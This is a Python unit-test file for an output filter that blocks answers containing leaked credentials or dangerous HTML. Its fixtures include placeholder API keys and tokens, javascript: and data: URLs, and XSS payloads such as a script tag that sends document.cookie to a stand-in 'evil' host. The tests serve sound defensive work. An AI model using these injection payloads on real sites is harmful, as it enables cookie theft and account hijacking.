"""Output filter — pure-function unit tests."""

from __future__ import annotations

import pytest

from app.services.output_filter import (
    SAFETY_REJECTION_MESSAGE,
    filter_answer,
    scan_output,
)

# ---------- HARD findings: text MUST be replaced ----------


@pytest.mark.parametrize(
    "payload",
    [
        # OpenAI / Anthropic-style key
        "API key for the demo: sk-1234567890abcdefghij1234",
        # Groq
        "Groq token: gsk_abcdefghijklmnop12345678",
        # GitHub PAT
        "ghp_abcdef1234567890abcdefghijklmnopqrst",
        # AWS access key id
        "Use AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
        # PEM
        "-----BEGIN RSA PRIVATE KEY-----\nMIIBOgIBAAJB\n-----END RSA PRIVATE KEY-----",
        # JWT
        "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.signaturepart",
    ],
)
def test_credential_patterns_replace_answer(payload: str) -> None:
    out, findings = filter_answer(payload)
    assert "credential_pattern" in findings
    assert out == SAFETY_REJECTION_MESSAGE


@pytest.mark.parametrize(
    "payload",
    [
        "<script>fetch('http://evil/?'+document.cookie)</script>",
        "<iframe src='https://attacker.example'></iframe>",
        "<embed src='x.swf'/>",
        "<object data='evil'></object>",
        "<style>@import 'evil.css'</style>",
        "<link rel='stylesheet' href='attacker.css'>",
    ],
)
def test_dangerous_html_replaces_answer(payload: str) -> None:
    out, findings = filter_answer(payload)
    assert "html_dangerous_tag" in findings
    assert out == SAFETY_REJECTION_MESSAGE


@pytest.mark.parametrize(
    "payload",
    [
        "Click here: javascript:alert(1)",
        "javascript : doStuff()",  # whitespace
        "JavaScript:bad()",  # mixed case
    ],
)
def test_javascript_url_replaces_answer(payload: str) -> None:
    out, findings = filter_answer(payload)
    assert "javascript_url" in findings
    assert out == SAFETY_REJECTION_MESSAGE


def test_data_url_html_replaces_answer() -> None:
    out, findings = filter_answer("data:text/html,<script>x()</script>")
    assert "data_url_html" in findings
    assert out == SAFETY_REJECTION_MESSAGE


# ---------- SOFT findings: text passes, finding is logged ----------


def test_unknown_url_is_soft_finding() -> None:
    out, findings = filter_answer("See https://example.com/foo for details.")
    assert any(f.startswith("unknown_url:") for f in findings)
    # SOFT — passes through
    assert out.startswith("See https://example.com")


# ---------- Clean text passes untouched ----------


@pytest.mark.parametrize(
    "payload",
    [
        "Photosynthesis is the process by which plants make food.",
        "नमस्ते दुनिया। यह एक हिंदी पाठ है।",
        "The answer is 42.",
        "",
    ],
)
def test_clean_text_passes_through(payload: str) -> None:
    out, findings = filter_answer(payload)
    assert out == payload
    # No HARD findings
    assert not any(
        f in findings
        for f in ("credential_pattern", "html_dangerous_tag", "javascript_url", "data_url_html")
    )


def test_scan_output_returns_safe_for_clean_text() -> None:
    findings, safe = scan_output("All clear here.")
    assert safe is True
    assert findings == []
